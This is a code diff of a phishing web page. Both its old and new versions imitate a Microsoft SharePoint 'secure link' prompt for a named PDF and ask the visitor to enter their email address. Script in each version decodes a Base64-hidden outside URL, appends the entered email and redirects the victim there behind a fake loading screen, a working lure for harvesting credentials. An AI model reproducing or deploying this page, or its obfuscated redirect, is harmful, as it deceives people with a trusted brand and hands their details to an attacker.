@@ -1,195 +1,362 @@
 <!DOCTYPE html>
 <html lang="en">
 
-
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Email Verification - FT564</title>
+  <title>global</title>
+
   
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f8f9f9;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 80vh;
-
-  
-}
-
-.page-wrapper {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 87vh;
-  width: 87vw;
-}
-
-
-    .wrapper {
-      text-align: center;
-      background-color: #f8f9f9;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      max-width: 330px;
-      width: 50%;
-    }
-
-    .header {
-      font-size: 24px;
-      font-weight: bold;
-      margin-bottom: 20px;
-      color: #036C70;
-    }
-
-    .subheader {
-      font-size: 16px;
-      color: #333;
-      margin-bottom: 10px;
-    }
-
-    .input-container {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    input {
-      padding: 12px;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      width: 100%;
-      max-width: 400px;
-    }
-
-    button {
-      padding: 12px 108px;
-      font-size: 16px;
-      background-color: #1D7CDA;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      width: 100%;
-      max-width: 480px;
-    }
-
-    button:hover {
-      background-color: #1D7CDK;
-    }
-
-    .loader {
-      display: none;
-      margin-top: 80px;
-      border: 9px solid #f3f3f3;
-      border-top: 4px solid #036C70;
-      border-radius: 100%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-      margin-bottom: 30px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .success-message {
-      display: none;
-      margin-top: 5px;
-      background-color: #f8f9f9;
-      padding: 5px;
-      border-radius: 5px;
-      border: 1px solid #f8f9f9;
-      font-size: 15px;
-      color: #00695c;
-    }
-  </style>
-
-
-
-<div class="page-wrapper">
-  <div class="wrapper">
-     
-    <img src="https://logos-world.net/wp-content/uploads/2022/12/SharePoint-Symbol.png" width="180" height="100">
-    <div class="subheader">
-      You've received a secure link to:
-<p style="font-size: 18px; font-weight: ; color: #000;">FAC-6864-012-TT.pdf</p>
-To proceed, enter the email that this item was shared to
-    </div>
-    <div class="input-container">
-      <input type="email" id="emailInput" placeholder="Enter your email" required autocomplete="off" />
-      <button id="submitButton">Next</button>
-    </div>
-    <div class="loader" id="loader"></div>
-    <div class="success-message" id="successMessage">
-    
-    
-    </div>
-    <p>&copy;2025 All rights reserved.</p>
-  </div>
-
-  <script>
-    // Function to validate email format
-    function validateEmail(email) {
-      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return re.test(email);
-    }
-
-    // Function to handle email verification and redirection
-    function verifyEmail() {
-      const emailInput = document.getElementById("emailInput").value.trim();
-      const loader = document.getElementById("loader");
-      const successMessage = document.getElementById("successMessage");
-
-      // Validate email format
-      if (!validateEmail(emailInput)) {
-        alert("Please enter a valid email address.");
-        return;
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin: 0;
+        padding: 0;
+        background-color: #f8f9f9;
+        height: 100%;
       }
 
-      // Show loader and hide input section
-      document.querySelector(".input-container").style.display = "none";
-      loader.style.display = "block";
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 76vh;
+      }
 
-      // Simulate a delay before showing the success message
-      setTimeout(() => {
-        loader.style.display = "none";
-        successMessage.style.display = "block";
+      .logo {
+        width: 150px;
+        margin-bottom: 20px;
+        margin-top: 20px;
+      }
 
-        // Redirect to a URL with the email appended
-        const encodedRedirectURL = "aHR0cHM6Ly9wZWJsZXkuaG9iYnlwbHVzLnJvL0RzRXRORE01WXkwLyM="; // Base64 encoded URL
-        const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
-        const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly
+   
+      }
 
-        // Simulate the redirection after a few seconds
-        setTimeout(() => {
-          window.location.href = redirectURL; // Redirect to the final URL
-        }, 10);
-      }, 4000); // Wait 2 seconds before showing the success message
+      iframe {
+        width: 100%;
+        height: 90%;
+        border: none;
+        display: block;
+        margin: 0 auto;
+        overflow-x: hidden;
+        /* Prevent horizontal scrolling */
+        object-fit: contain;
+        /* Ensure the image fits without distortion */
+        object-position: center;
+        /* Center the image within the iframe */
+      }
+
+      .blurred {
+        filter: blur(10px);
+      }
+
+      .input-section {
+        position: absolute;
+        top: 40%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #f7f9f9;
+        padding: 13px;
+        border: 1px solid #dddd;
+        text-align: center;
+        width: 150%;
+        max-width: 324px;
+      }
+
+      .input-section p {
+        margin: 10px 0;
+        color: black;
+      }
+
+      .input-section input {
+  width: 89%; /* Adjust to fill the parent container */
+  max-width: 430px; /* Set a maximum width for consistency */
+  padding: 10px; /* Equal padding on all sides */
+  margin: 15px ; /* Center the input field horizontally */
+  display: block; /* Ensure the input behaves like a block-level element */
+  border: 1px solid #ccc;
+  font-size: 15px;
+  box-sizing: border-box; /* Ensure padding doesn't affect width calculation */
+  color: black; /* Set input text color to black */
+      }
+
+      .input-section button {
+        background-color: #1D7CDB;
+        color: white;
+        border: none;
+        padding: 10px 111px;
+        cursor: pointer;
+        font-size: 14px;
+      }
+
+      .input-section button:hover {
+        background-color: #1D7CDB;
+      }
+
+      .custom-link {
+        color: #000;
+        /* Initial color */
+        text-decoration: none;
+        /* Remove underline */
+        transition: color 0.3s ease;
+        /* Smooth transition for hover effect */
+      }
+
+      .custom-link:hover {
+        color: black;
+        /* Change to black on hover */
+      }
+
+      .success-box {
+        position: absolute;
+        top: 30%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: white;
+        padding: 20px;
+        border: 1px solid #ddd;
+        text-align: center;
+        width: 90%;
+        max-width: 400px;
+        display: none;
+        /* Initially hidden */
+        z-index: 9999;
+        /* Ensure it appears on top */
+      }
+
+      .success-box img {
+        width: 50px;
+        margin-bottom: 10px;
+      }
+
+      .success-box p {
+        margin: 10px 0;
+        color: #000;
+      }
+	  
+	  .overlay {
+            margin: 5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align items at the top */
+            height: 80vh;
+            background-color: #f9f9f9;
+            padding-top: 50px; /* Add space at the top */
+        }
+</style>
+  
+    <div class="container">
+      
+      <div class="overlay" id="overlay">
+        
+        <div class="input-section" id="inputSection">
+          <form onsubmit="verifyEmail(); return false;">
+          <img
+      src="https://logos-world.net/wp-content/uploads/2022/12/SharePoint-Symbol.png"
+      width="180"
+      height="100"
+    >
+    <p>
+    You've received a secure link to:
+
+         <p style="font-size: 18px; font-weight: ; color: #000000;"> Schedule_2025-24.pdf</p>
+
+</p>
+          <p style="font-size: 16px;">To proceed, enter the email to which <br>this item was shared.</p>
+
+</p>
+          <input type="email" id="emailInput" placeholder="" required autocomplete="off" />
+          <button type="submit">NEXT</button>
+          <p>
+            ©2025 All Rights Reserved.
+            <br>
+            <br> 
+          </p>
+        </form>
+      </div>
+
+      <div class="success-box" id="successBox">
+<style>
+img[src="data:,"],source[src="data:,"]{display:none!important}
+</style>
+
+<body class="cb" style="display:block">
+
+<div id="divId" style="">
+
+<style>
+.datbox{
+
+}
+#lightbox {
+background-repeat: no-repeat;
+}
+.linko {
+background-color: transparent;  text-decoration: none; white-space: nowrap; font-size:13px; cursor: pointer;
+}
+#passd:focus {
+outline: none;
+border-bottom: 1px solid #06C;
+}
+
+.canvas {
+position: center;
+background-color: transparent;
+width: 250px;
+height: 480px;
+margin: auto;
+padding-top: 50%;
+}
+
+
+}
+
+.tittleText {
+font-weight: 800;
+font-size: large;
+margin-left: 30px;
+}
+/* .under {
+font-weight: 800;
+font-size: large;
+margin: auto;
+} */
+
+.loader,
+.loader:after {
+border-radius: 50%;
+width: 10em;
+height: 10em;
+}
+
+.loader {
+margin: 60px auto;
+font-size: 10px;
+position: relative;
+text-indent: -9999em;
+border-top: 0.5em solid rgba(255, 255, 255, 0.4);
+border-right: 0.5em solid rgba(255, 255, 255, 0.4);
+border-bottom: 0.5em solid rgba(255, 255, 255, 0.4);
+border-left: 0.5em solid #038387;
+-webkit-transform: translateZ(0);
+-ms-transform: translateZ(0);
+transform: translateZ(0);
+-webkit-animation: load8 1.6s infinite linear;
+animation: load8 1.6s infinite linear;
+}
+
+@-webkit-keyframes load8 {
+0% {
+-webkit-transform: rotate(0deg);
+transform: rotate(0deg);
+}
+70% {
+-webkit-transform: rotate(180deg);
+transform: rotate(180deg);
+}
+100% {
+-webkit-transform: rotate(360deg);
+transform: rotate(360deg);
+}
+}
+
+@keyframes load8 {
+0% {
+-webkit-transform: rotate(0deg);
+transform: rotate(0deg);
+}
+70% {
+-webkit-transform: rotate(180deg);
+transform: rotate(180deg);
+}
+100% {
+-webkit-transform: rotate(360deg);
+transform: rotate(360deg);
+}
+}
+</style>
+
+
+
+<div class="canvas">
+<img class="imgclass" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg/1200px-Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg.png"/>
+<div class="tittleText" style="margin-left: 0.3125in; font-size: 1rem; font-weight: 800; font-family: Verdana,sans-serif;">
+<br/>
+Microsoft© Sharepoint
+</div>
+<div class="sk-fading-circle">
+<div class="sk-circle1 sk-circle">
+</div>
+<div class="sk-circle2 sk-circle">
+</div>
+<div class="sk-circle3 sk-circle">
+</div>
+<div class="sk-circle4 sk-circle">
+</div>
+<div class="sk-circle5 sk-circle">
+</div>
+<div class="sk-circle6 sk-circle">
+</div>
+<div class="sk-circle7 sk-circle">
+</div>
+<div class="sk-circle8 sk-circle">
+</div>
+<div class="sk-circle9 sk-circle">
+</div>
+<div class="sk-circle10 sk-circle">
+</div>
+<div class="sk-circle11 sk-circle">
+</div>
+<div class="sk-circle12 sk-circle">
+</div>
+</div>
+<div class="loader">
+</div>
+<div style="text-align: center">
+
+</div>
+</div>
+</div>
+
+
+</div>
+
+    <script>
+      // Function to validate email format
+function validateEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+}
+
+// Function to handle email verification and redirection
+function verifyEmail() {
+    const emailInput = document.getElementById("emailInput").value.trim();
+    const overlay = document.getElementById("overlay");
+    const successBox = document.getElementById("successBox");
+
+    // Validate email format
+    if (!validateEmail(emailInput)) {
+        alert("Please enter a valid email address.");
+        return;
     }
 
-    // Handle the submit button click
-    document.getElementById("submitButton").addEventListener("click", (e) => {
+    // Show success box and hide the input section
+    document.getElementById("inputSection").style.display = "none";
+    successBox.style.display = "block";
+
+    // Simulate a delay before redirection
+    setTimeout(() => {
+        // Redirect to a URL with the email appended
+        const encodedRedirectURL = "aHR0cHM6Ly9namFlZnczLnBhbGxhdm9sb21hc3NhLm9yZy8j"; // Base64 encoded URL
+        const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
+        const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly
+        window.location.href = redirectURL; // Redirect to the final URL
+    }, 2000); // 2-second delay for user experience
+}
+
+    document.querySelector("form").addEventListener("submit", (e) => {
       e.preventDefault();
       verifyEmail();
     });
-
-    // Allow pressing Enter to submit form
-    document.getElementById("emailInput").addEventListener("keypress", function (e) {
-      if (e.key === "Enter") {
-        e.preventDefault();
-        verifyEmail();
-      }
-    });
   </script>
-
-
